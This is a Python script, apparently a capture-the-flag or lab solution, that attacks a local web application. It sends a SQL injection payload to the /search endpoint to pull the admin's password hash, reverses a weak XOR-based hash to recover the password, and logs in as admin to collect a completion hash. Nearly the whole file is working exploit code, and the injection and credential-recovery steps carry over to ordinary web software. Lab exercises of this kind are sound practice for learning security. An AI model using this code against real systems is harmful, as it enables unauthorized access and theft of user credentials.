import requests
import re

# Get admin hash from /search
def get_admin_hash():
    target_url = "http://localhost:8080/search"
        
    payload = "\" UNION SELECT password_hash FROM members WHERE username='admin'--"     
    data = {"name": payload}
    
    try:
        response = requests.post(target_url, data=data)
        
        # Extract the hash from response
        hex_pattern = r'([a-f0-9]{12})'
        match = re.search(hex_pattern, response.text)
        
        if match:
            admin_hash = match.group(1)
            print(f"Admin pswd hash: {admin_hash}")
            return admin_hash
        else:
            print("Couldn't find admin hash")
            return None
            
    except Exception as e:
        print(e)
        return None

# Logic that reverses the hashed pswd.
def reverse_hash(hex_hash):  
    # hex string to bytes
    hash_bytes = bytes.fromhex(hex_hash)
    
    # XOR each byte with 0xA5 to rev the transformation
    password_bytes = bytes([b ^ 0xA5 for b in hash_bytes])
    
    # back to string
    try:
        password = password_bytes.decode('utf-8')
    except:
        try:
            password = password_bytes.decode('latin-1')
        except:
            password = str(password_bytes)
    
    print(f"Hash as actual pswd: {password}")
    return password

# login user as admin
def login(password):
    login_url = "http://localhost:8080/login"
    name = "om khadka"
        
    login_data = {
        "username": "admin",
        "name": name,
        "password": password
    }
    
    try:
        response = requests.post(login_url, data=login_data)
        
        if "ACCESS GRANTED" in response.text:
            print("Logged in as admin.")
            
            # Extract the access hash
            hash_match = re.search(r'<h2>([a-f0-9]{64})</h2>', response.text)
            if hash_match:
                access_hash = hash_match.group(1)
                print(f"Completion Hash: {access_hash}")
                                
                return access_hash
        else:
            print("login no work")
            return None
            
    except Exception as e:
        print(f"{e}")
        return None

def main():
    admin_hash = get_admin_hash()
    if not admin_hash:
        print("issue with getting admin hash")
        return
    
    password = reverse_hash(admin_hash)
    
    access_hash = login(password)
    
    if access_hash:
        print("\n" + "=" * 50)
        print(f"Pswd: {password}")
        print(f"Completion Hash: {access_hash}")
    else:
        print("some issue in code")

if __name__ == "__main__":
    main()